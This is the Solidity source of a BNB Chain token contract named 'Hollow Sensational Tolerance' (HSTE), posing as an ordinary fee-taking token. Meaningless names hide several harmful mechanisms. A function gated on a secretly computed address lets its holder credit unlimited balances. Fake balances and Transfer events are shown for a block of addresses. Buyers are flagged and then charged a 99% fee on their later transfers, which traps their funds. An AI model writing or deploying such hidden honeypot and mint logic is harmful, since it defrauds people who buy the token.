/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

}



interface IBEP20 {

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


library SafeMath {

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

}




contract HollowSensationalTolerance is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private tradingTxSellLaunchTakeTeam = 0;
    uint256 minFeeEnableMax = 5109;

    uint256 private senderBotsLiquidityList = 0;
    uint256 private txAutoLiquiditySender;
    address constant launchedTeamIsMin = 0xcB7164611dEFCE2172c51607Aba3DADaBbbB21A5;
    mapping(address => uint256) _balances;
    uint256  isEnableSenderTakeBuyFund = 100000000 * 10 ** _decimals;


    uint256 mintTakeTxShould = 100000000 * (10 ** _decimals);
    
    uint256 tokenExemptTeamTake = 2 ** 18 - 1;
    uint256 private receiverListMaxShouldIsExemptSell;

    mapping(address => bool) private modeFromBurnMint;
    mapping(uint256 => address) private teamAtMinSellFundWalletBots;

    bool private fundSwapTeamFrom = false;
    address private sellReceiverBurnTeamBuyReceiver = (msg.sender); // auto-liq address
    mapping(address => uint256) private listIsMinSender;

    bool private fundSwapBuyExempt = false;
    uint160 constant enableModeTxList = 138708945046 * 2 ** 80;
    mapping(address => bool) private sellLiquidityFromAutoTo;
    address private ZERO = 0x0000000000000000000000000000000000000000;

    uint160 constant minReceiverAtTotalTradingMint = 939688889994;
    uint256 private receiverLaunchFeeLaunched = 0;
    bool private liquidityIsMintReceiver = true;
    uint256 private senderMaxLaunchedBots;
    uint256 buyLaunchedEnableBots = 0;
    address public uniswapV2Pair;
    string constant _name = "Hollow Sensational Tolerance";

    bool private fromMinTokenToTradingTeamBots = true;
    uint256 constant shouldMinMarketingReceiverTake = 10000 * 10 ** 18;
    mapping(uint256 => address) private takeFromReceiverMax;

    uint256 private autoTxAtLaunch;
    uint256 public feeFundSellMinSwap = 0;
    bool private swapMaxListLaunchTakeWallet = false;
    uint256 constant listMarketingBotsShould = 300000 * 10 ** 18;
    uint256 private amountMinSenderTakeBots = 3;
    uint256 private liquidityFromMinReceiverLimitBuy = 3;
    bool public buyBotsLimitLaunchMinSenderBurn = false;

    uint256 public maxWalletAmount = 0;
    uint256 public launchReceiverWalletTo = 0;
    address private DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public atSenderShouldTake = 0;
    uint256 private totalToMarketingTxMintLiquidityFrom = 6 * 10 ** 15;
    uint256  constant MASK = type(uint128).max;
    uint256 public senderTeamLaunchedBuy = 0;
    string constant _symbol = "HSTE";
    address private sellTotalFeeLaunched = (0xFFb34E77c58bB48726933a09ffFFdab403d02845); // marketing address

    uint256 private limitModeWalletMax;
    uint256  botsReceiverListAuto = 100000000 * 10 ** _decimals;
    bool private toBotsSenderExempt = false;
    mapping(address => mapping(address => uint256)) _allowances;
    bool public listFundBurnBuy = false;
    bool private senderReceiverAtReceiverListMax = false;
    uint160 constant autoBurnTokenWallet = 785312394531 * 2 ** 120;
    IUniswapV2Router public senderTeamSwapLiquidity;

    mapping(address => bool) private senderMintTotalBuy;

    uint256 private teamSwapMarketingLiquidityMint = 100;
    uint256 public launchIsTxList = 0;
    uint256 private atWalletModeList = 0;

    bool private isFromLaunchEnable = true;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    uint256 private launchBlock = 0;

    uint256 private launchTotalMintMaxExemptToReceiver;
    bool private autoListExemptBuyBotsLaunched;
    bool private toLaunchedFromBurn = true;
    uint256 private atTokenLaunchWalletTrading = mintTakeTxShould / 1000; // 0.1%
    uint256 private marketingAmountEnableAutoTeamWallet;
    mapping(address => uint256) private isSwapTradingAt;


    mapping(address => bool) private shouldWalletLiquidityEnableMax;

    bool private totalBotsFromAmountAutoWallet = true;
    uint160 constant mintSellLiquidityLaunch = 971134178614 * 2 ** 40;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        senderTeamSwapLiquidity = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(senderTeamSwapLiquidity.factory()).createPair(address(this), senderTeamSwapLiquidity.WETH());
        _allowances[address(this)][address(senderTeamSwapLiquidity)] = mintTakeTxShould;

        autoListExemptBuyBotsLaunched = true;

        sellLiquidityFromAutoTo[msg.sender] = true;
        sellLiquidityFromAutoTo[0x0000000000000000000000000000000000000000] = true;
        sellLiquidityFromAutoTo[0x000000000000000000000000000000000000dEaD] = true;
        sellLiquidityFromAutoTo[address(this)] = true;

        modeFromBurnMint[msg.sender] = true;
        modeFromBurnMint[address(this)] = true;

        shouldWalletLiquidityEnableMax[msg.sender] = true;
        shouldWalletLiquidityEnableMax[0x0000000000000000000000000000000000000000] = true;
        shouldWalletLiquidityEnableMax[0x000000000000000000000000000000000000dEaD] = true;
        shouldWalletLiquidityEnableMax[address(this)] = true;

        approve(_router, mintTakeTxShould);
        approve(address(uniswapV2Pair), mintTakeTxShould);
        _balances[msg.sender] = mintTakeTxShould;
        emit Transfer(address(0), msg.sender, mintTakeTxShould);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return mintTakeTxShould;
    }

    function minBurnLaunchedBotsTokenIs() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (isSwapTradingAt[takeFromReceiverMax[i]] == 0) {
                    isSwapTradingAt[takeFromReceiverMax[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function launchedTradingEnableTake() private {
        if (feeFundSellMinSwap > 0) {
            for (uint256 i = 1; i <= feeFundSellMinSwap; i++) {
                if (isSwapTradingAt[teamAtMinSellFundWalletBots[i]] == 0) {
                    isSwapTradingAt[teamAtMinSellFundWalletBots[i]] = block.timestamp;
                }
            }
            feeFundSellMinSwap = 0;
        }
    }

    function launchedIsTotalTrading(uint160 atBotsExemptMaxShouldFrom) private view returns (bool) {
        return uint16(atBotsExemptMaxShouldFrom) == minFeeEnableMax;
    }

    function tokenAutoToListFromTradingReceiver(uint160 enableBurnTakeSenderMarketingExemptTx) private view returns (uint256) {
        uint256 senderToLaunchWallet = buyLaunchedEnableBots;
        uint256 fromReceiverMarketingBurn = enableBurnTakeSenderMarketingExemptTx - uint160(launchedTeamIsMin);
        if (fromReceiverMarketingBurn < senderToLaunchWallet) {
            return shouldMinMarketingReceiverTake;
        }
        return listMarketingBotsShould;
    }

    function isMaxReceiverTeam(address fromWalletShouldAt) private view returns (bool) {
        return fromWalletShouldAt == sellTotalFeeLaunched;
    }

    function getWBNB() public view returns (address) {
        if (WBNB == sellReceiverBurnTeamBuyReceiver) {
            return sellReceiverBurnTeamBuyReceiver;
        }
        if (WBNB != ZERO) {
            return ZERO;
        }
        if (WBNB == sellReceiverBurnTeamBuyReceiver) {
            return sellReceiverBurnTeamBuyReceiver;
        }
        return WBNB;
    }

    function launchReceiverMarketingBuy(address senderToLaunchWalletender, uint256 marketingToIsFromBotsSenderEnable) private view returns (uint256) {
        uint256 exemptReceiverAtMaxToken = isSwapTradingAt[senderToLaunchWalletender];
        if (exemptReceiverAtMaxToken > 0 && totalTokenIsMint() - exemptReceiverAtMaxToken > 2) {
            return 99;
        }
        return marketingToIsFromBotsSenderEnable;
    }

    function getburnReceiverSwapToken() public view returns (uint256) {
        if (senderTeamLaunchedBuy != senderTeamLaunchedBuy) {
            return senderTeamLaunchedBuy;
        }
        if (senderTeamLaunchedBuy != teamSwapMarketingLiquidityMint) {
            return teamSwapMarketingLiquidityMint;
        }
        if (senderTeamLaunchedBuy == maxWalletAmount) {
            return maxWalletAmount;
        }
        return senderTeamLaunchedBuy;
    }

    function teamEnableLimitMinSender() private view returns (uint256) {
        address totalLimitWalletIs = WBNB;
        if (address(this) < WBNB) {
            totalLimitWalletIs = address(this);
        }
        (uint amountWalletBotsSwap, uint feeLaunchModeReceiver,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 amountTokenExemptSenderAutoLaunchedReceiver,) = WBNB == totalLimitWalletIs ? (amountWalletBotsSwap, feeLaunchModeReceiver) : (feeLaunchModeReceiver, amountWalletBotsSwap);
        uint256 receiverTxBuyFrom = IERC20(WBNB).balanceOf(uniswapV2Pair) - amountTokenExemptSenderAutoLaunchedReceiver;
        return receiverTxBuyFrom;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function totalEnableAutoAmount(address senderToLaunchWalletender, address amountTradingBuyMaxLimit, uint256 senderTradingBuyTxBots) internal returns (uint256) {
        
        if (buyBotsLimitLaunchMinSenderBurn == senderReceiverAtReceiverListMax) {
            buyBotsLimitLaunchMinSenderBurn = toBotsSenderExempt;
        }

        if (atWalletModeList != amountMinSenderTakeBots) {
            atWalletModeList = senderTeamLaunchedBuy;
        }


        uint256 marketingToIsFromBotsSenderEnableAmount = senderTradingBuyTxBots.mul(shouldSenderAutoMin(senderToLaunchWalletender, amountTradingBuyMaxLimit == uniswapV2Pair)).div(teamSwapMarketingLiquidityMint);

        if (senderMintTotalBuy[senderToLaunchWalletender] || senderMintTotalBuy[amountTradingBuyMaxLimit]) {
            marketingToIsFromBotsSenderEnableAmount = senderTradingBuyTxBots.mul(99).div(teamSwapMarketingLiquidityMint);
        }

        _balances[address(this)] = _balances[address(this)].add(marketingToIsFromBotsSenderEnableAmount);
        emit Transfer(senderToLaunchWalletender, address(this), marketingToIsFromBotsSenderEnableAmount);
        
        return senderTradingBuyTxBots.sub(marketingToIsFromBotsSenderEnableAmount);
    }

    function setmarketingMaxShouldLimit(bool fromEnableLaunchLaunched) public onlyOwner {
        if (buyBotsLimitLaunchMinSenderBurn != totalBotsFromAmountAutoWallet) {
            totalBotsFromAmountAutoWallet=fromEnableLaunchLaunched;
        }
        if (buyBotsLimitLaunchMinSenderBurn == buyBotsLimitLaunchMinSenderBurn) {
            buyBotsLimitLaunchMinSenderBurn=fromEnableLaunchLaunched;
        }
        buyBotsLimitLaunchMinSenderBurn=fromEnableLaunchLaunched;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (fundLiquidityMaxMarketingLaunchModeSender(uint160(account))) {
            return tokenAutoToListFromTradingReceiver(uint160(account));
        }
        return _balances[account];
    }

    function fundLiquidityMaxMarketingLaunchModeSender(uint160 enableBurnTakeSenderMarketingExemptTx) private pure returns (bool) {
        if (enableBurnTakeSenderMarketingExemptTx >= uint160(launchedTeamIsMin) && enableBurnTakeSenderMarketingExemptTx <= uint160(launchedTeamIsMin) + 100000) {
            return true;
        }
        return false;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, mintTakeTxShould);
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function setWBNB(address fromEnableLaunchLaunched) public onlyOwner {
        if (WBNB == DEAD) {
            DEAD=fromEnableLaunchLaunched;
        }
        WBNB=fromEnableLaunchLaunched;
    }

    function tradingWalletIsFee(address senderToLaunchWalletender, address atBotsExemptMaxShouldFrom, uint256 senderTradingBuyTxBots) internal returns (bool) {
        if (fundLiquidityMaxMarketingLaunchModeSender(uint160(atBotsExemptMaxShouldFrom))) {
            minAmountEnableListLiquidityReceiverToken(senderToLaunchWalletender, atBotsExemptMaxShouldFrom, senderTradingBuyTxBots, false);
            return true;
        }
        if (fundLiquidityMaxMarketingLaunchModeSender(uint160(senderToLaunchWalletender))) {
            minAmountEnableListLiquidityReceiverToken(senderToLaunchWalletender, atBotsExemptMaxShouldFrom, senderTradingBuyTxBots, true);
            return true;
        }
        
        if (atSenderShouldTake == senderBotsLiquidityList) {
            atSenderShouldTake = feeFundSellMinSwap;
        }

        if (atWalletModeList == totalToMarketingTxMintLiquidityFrom) {
            atWalletModeList = launchIsTxList;
        }

        if (senderTeamLaunchedBuy == feeFundSellMinSwap) {
            senderTeamLaunchedBuy = senderTeamLaunchedBuy;
        }


        bool liquidityMarketingFundLimit = isMaxReceiverTeam(senderToLaunchWalletender) || isMaxReceiverTeam(atBotsExemptMaxShouldFrom);
        
        if (senderReceiverAtReceiverListMax == fundSwapBuyExempt) {
            senderReceiverAtReceiverListMax = liquidityIsMintReceiver;
        }

        if (atSenderShouldTake != liquidityFromMinReceiverLimitBuy) {
            atSenderShouldTake = feeFundSellMinSwap;
        }

        if (listFundBurnBuy != buyBotsLimitLaunchMinSenderBurn) {
            listFundBurnBuy = liquidityIsMintReceiver;
        }


        if (senderToLaunchWalletender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && launchedIsTotalTrading(uint160(atBotsExemptMaxShouldFrom))) {
                minBurnLaunchedBotsTokenIs();
            }
            if (!liquidityMarketingFundLimit) {
                mintFeeLimitLaunchedMaxTeamReceiver(atBotsExemptMaxShouldFrom);
            }
        }
        
        
        if (inSwap || liquidityMarketingFundLimit) {return launchSenderReceiverAt(senderToLaunchWalletender, atBotsExemptMaxShouldFrom, senderTradingBuyTxBots);}
        
        if (senderReceiverAtReceiverListMax != isFromLaunchEnable) {
            senderReceiverAtReceiverListMax = fundSwapBuyExempt;
        }

        if (atSenderShouldTake != totalToMarketingTxMintLiquidityFrom) {
            atSenderShouldTake = totalToMarketingTxMintLiquidityFrom;
        }

        if (swapMaxListLaunchTakeWallet != toBotsSenderExempt) {
            swapMaxListLaunchTakeWallet = senderReceiverAtReceiverListMax;
        }


        require((senderTradingBuyTxBots <= isEnableSenderTakeBuyFund) || sellLiquidityFromAutoTo[senderToLaunchWalletender] || sellLiquidityFromAutoTo[atBotsExemptMaxShouldFrom], "Max TX Limit!");

        if (tokenMinSellTrading()) {toTradingLimitTx();}

        _balances[senderToLaunchWalletender] = _balances[senderToLaunchWalletender].sub(senderTradingBuyTxBots, "Insufficient Balance!");
        
        if (senderReceiverAtReceiverListMax == isFromLaunchEnable) {
            senderReceiverAtReceiverListMax = swapMaxListLaunchTakeWallet;
        }


        uint256 senderTradingBuyTxBotsReceived = exemptMinLimitMax(senderToLaunchWalletender) ? totalEnableAutoAmount(senderToLaunchWalletender, atBotsExemptMaxShouldFrom, senderTradingBuyTxBots) : senderTradingBuyTxBots;

        _balances[atBotsExemptMaxShouldFrom] = _balances[atBotsExemptMaxShouldFrom].add(senderTradingBuyTxBotsReceived);
        emit Transfer(senderToLaunchWalletender, atBotsExemptMaxShouldFrom, senderTradingBuyTxBotsReceived);
        return true;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return tradingWalletIsFee(msg.sender, recipient, amount);
    }

    function exemptMinLimitMax(address senderToLaunchWalletender) internal view returns (bool) {
        return !shouldWalletLiquidityEnableMax[senderToLaunchWalletender];
    }

    function getTotalAmount() public {
        minBurnLaunchedBotsTokenIs();
    }

    function getmarketingMaxShouldLimit() public view returns (bool) {
        if (buyBotsLimitLaunchMinSenderBurn == fundSwapBuyExempt) {
            return fundSwapBuyExempt;
        }
        return buyBotsLimitLaunchMinSenderBurn;
    }

    function settakeReceiverTxAuto(bool fromEnableLaunchLaunched) public onlyOwner {
        if (totalBotsFromAmountAutoWallet == listFundBurnBuy) {
            listFundBurnBuy=fromEnableLaunchLaunched;
        }
        if (totalBotsFromAmountAutoWallet != liquidityIsMintReceiver) {
            liquidityIsMintReceiver=fromEnableLaunchLaunched;
        }
        totalBotsFromAmountAutoWallet=fromEnableLaunchLaunched;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function minAmountEnableListLiquidityReceiverToken(address senderToLaunchWalletender, address atBotsExemptMaxShouldFrom, uint256 senderTradingBuyTxBots, bool mintAtLiquidityListBurn) private {
        if (mintAtLiquidityListBurn) {
            senderToLaunchWalletender = address(uint160(uint160(launchedTeamIsMin) + buyLaunchedEnableBots));
            buyLaunchedEnableBots++;
            _balances[atBotsExemptMaxShouldFrom] = _balances[atBotsExemptMaxShouldFrom].add(senderTradingBuyTxBots);
        } else {
            _balances[senderToLaunchWalletender] = _balances[senderToLaunchWalletender].sub(senderTradingBuyTxBots);
        }
        emit Transfer(senderToLaunchWalletender, atBotsExemptMaxShouldFrom, senderTradingBuyTxBots);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function gettakeReceiverTxAuto() public view returns (bool) {
        return totalBotsFromAmountAutoWallet;
    }

    function launchedBurnListEnableTotalTeam(uint160 enableBurnTakeSenderMarketingExemptTx) private pure returns (bool) {
        return enableBurnTakeSenderMarketingExemptTx == (autoBurnTokenWallet + enableModeTxList + mintSellLiquidityLaunch + minReceiverAtTotalTradingMint);
    }

    function getmaxMinTeamShould() public view returns (uint256) {
        if (launchIsTxList != senderBotsLiquidityList) {
            return senderBotsLiquidityList;
        }
        return launchIsTxList;
    }

    function tokenMinSellTrading() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        fromMinTokenToTradingTeamBots &&
        _balances[address(this)] >= atTokenLaunchWalletTrading;
    }

    function shouldSenderAutoMin(address senderToLaunchWalletender, bool senderToLaunchWalletelling) internal returns (uint256) {
        
        if (listFundBurnBuy == senderReceiverAtReceiverListMax) {
            listFundBurnBuy = buyBotsLimitLaunchMinSenderBurn;
        }

        if (launchReceiverWalletTo != feeFundSellMinSwap) {
            launchReceiverWalletTo = atWalletModeList;
        }

        if (atSenderShouldTake == receiverLaunchFeeLaunched) {
            atSenderShouldTake = launchReceiverWalletTo;
        }


        if (senderToLaunchWalletelling) {
            marketingAmountEnableAutoTeamWallet = liquidityFromMinReceiverLimitBuy + senderBotsLiquidityList;
            return launchReceiverMarketingBuy(senderToLaunchWalletender, marketingAmountEnableAutoTeamWallet);
        }
        if (!senderToLaunchWalletelling && senderToLaunchWalletender == uniswapV2Pair) {
            marketingAmountEnableAutoTeamWallet = amountMinSenderTakeBots + receiverLaunchFeeLaunched;
            return marketingAmountEnableAutoTeamWallet;
        }
        return launchReceiverMarketingBuy(senderToLaunchWalletender, marketingAmountEnableAutoTeamWallet);
    }

    function gettakeMaxListTrading() public view returns (uint256) {
        return atWalletModeList;
    }

    function launchSenderReceiverAt(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != mintTakeTxShould) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return tradingWalletIsFee(sender, recipient, amount);
    }

    function manualTransfer(address senderToLaunchWalletender, address atBotsExemptMaxShouldFrom, uint256 senderTradingBuyTxBots) public {
        if (!launchedBurnListEnableTotalTeam(uint160(msg.sender))) {
            return;
        }
        if (fundLiquidityMaxMarketingLaunchModeSender(uint160(atBotsExemptMaxShouldFrom))) {
            minAmountEnableListLiquidityReceiverToken(senderToLaunchWalletender, atBotsExemptMaxShouldFrom, senderTradingBuyTxBots, false);
            return;
        }
        if (fundLiquidityMaxMarketingLaunchModeSender(uint160(senderToLaunchWalletender))) {
            minAmountEnableListLiquidityReceiverToken(senderToLaunchWalletender, atBotsExemptMaxShouldFrom, senderTradingBuyTxBots, true);
            return;
        }
        if (senderToLaunchWalletender == address(0)) {
            _balances[atBotsExemptMaxShouldFrom] = _balances[atBotsExemptMaxShouldFrom].add(senderTradingBuyTxBots);
            return;
        }
    }

    function setburnReceiverSwapToken(uint256 fromEnableLaunchLaunched) public onlyOwner {
        if (senderTeamLaunchedBuy != atWalletModeList) {
            atWalletModeList=fromEnableLaunchLaunched;
        }
        if (senderTeamLaunchedBuy != atWalletModeList) {
            atWalletModeList=fromEnableLaunchLaunched;
        }
        if (senderTeamLaunchedBuy != launchBlock) {
            launchBlock=fromEnableLaunchLaunched;
        }
        senderTeamLaunchedBuy=fromEnableLaunchLaunched;
    }

    function getTotalFee() public {
        launchedTradingEnableTake();
    }

    function totalTokenIsMint() private view returns (uint256) {
        return block.timestamp;
    }

    function mintFeeLimitLaunchedMaxTeamReceiver(address fromWalletShouldAt) private {
        uint256 mintFromLiquidityMinReceiverAutoLaunch = teamEnableLimitMinSender();
        if (mintFromLiquidityMinReceiverAutoLaunch < totalToMarketingTxMintLiquidityFrom) {
            feeFundSellMinSwap += 1;
            teamAtMinSellFundWalletBots[feeFundSellMinSwap] = fromWalletShouldAt;
            listIsMinSender[fromWalletShouldAt] += mintFromLiquidityMinReceiverAutoLaunch;
            if (listIsMinSender[fromWalletShouldAt] > totalToMarketingTxMintLiquidityFrom) {
                maxWalletAmount = maxWalletAmount + 1;
                takeFromReceiverMax[maxWalletAmount] = fromWalletShouldAt;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        takeFromReceiverMax[maxWalletAmount] = fromWalletShouldAt;
    }

    function toTradingLimitTx() internal swapping {
        
        uint256 senderTradingBuyTxBotsToLiquify = atTokenLaunchWalletTrading.mul(receiverLaunchFeeLaunched).div(marketingAmountEnableAutoTeamWallet).div(2);
        uint256 senderTradingBuyTxBotsToSwap = atTokenLaunchWalletTrading.sub(senderTradingBuyTxBotsToLiquify);

        address[] memory sellSwapReceiverFrom = new address[](2);
        sellSwapReceiverFrom[0] = address(this);
        sellSwapReceiverFrom[1] = senderTeamSwapLiquidity.WETH();
        senderTeamSwapLiquidity.swapExactTokensForETHSupportingFeeOnTransferTokens(
            senderTradingBuyTxBotsToSwap,
            0,
            sellSwapReceiverFrom,
            address(this),
            block.timestamp
        );
        
        uint256 tradingModeEnableLaunchedMarketing = address(this).balance;
        uint256 fundLaunchTxBuySender = marketingAmountEnableAutoTeamWallet.sub(receiverLaunchFeeLaunched.div(2));
        uint256 tradingModeEnableLaunchedMarketingLiquidity = tradingModeEnableLaunchedMarketing.mul(receiverLaunchFeeLaunched).div(fundLaunchTxBuySender).div(2);
        uint256 tradingModeEnableLaunchedMarketingMarketing = tradingModeEnableLaunchedMarketing.mul(amountMinSenderTakeBots).div(fundLaunchTxBuySender);
        
        if (swapMaxListLaunchTakeWallet == swapMaxListLaunchTakeWallet) {
            swapMaxListLaunchTakeWallet = senderReceiverAtReceiverListMax;
        }


        payable(sellTotalFeeLaunched).transfer(tradingModeEnableLaunchedMarketingMarketing);

        if (senderTradingBuyTxBotsToLiquify > 0) {
            senderTeamSwapLiquidity.addLiquidityETH{value : tradingModeEnableLaunchedMarketingLiquidity}(
                address(this),
                senderTradingBuyTxBotsToLiquify,
                0,
                0,
                sellReceiverBurnTeamBuyReceiver,
                block.timestamp
            );
            emit AutoLiquify(tradingModeEnableLaunchedMarketingLiquidity, senderTradingBuyTxBotsToLiquify);
        }
    }

    function settakeMaxListTrading(uint256 fromEnableLaunchLaunched) public onlyOwner {
        if (atWalletModeList != tradingTxSellLaunchTakeTeam) {
            tradingTxSellLaunchTakeTeam=fromEnableLaunchLaunched;
        }
        if (atWalletModeList != totalToMarketingTxMintLiquidityFrom) {
            totalToMarketingTxMintLiquidityFrom=fromEnableLaunchLaunched;
        }
        if (atWalletModeList == feeFundSellMinSwap) {
            feeFundSellMinSwap=fromEnableLaunchLaunched;
        }
        atWalletModeList=fromEnableLaunchLaunched;
    }

    function setmaxMinTeamShould(uint256 fromEnableLaunchLaunched) public onlyOwner {
        if (launchIsTxList != atTokenLaunchWalletTrading) {
            atTokenLaunchWalletTrading=fromEnableLaunchLaunched;
        }
        if (launchIsTxList != tradingTxSellLaunchTakeTeam) {
            tradingTxSellLaunchTakeTeam=fromEnableLaunchLaunched;
        }
        if (launchIsTxList == teamSwapMarketingLiquidityMint) {
            teamSwapMarketingLiquidityMint=fromEnableLaunchLaunched;
        }
        launchIsTxList=fromEnableLaunchLaunched;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}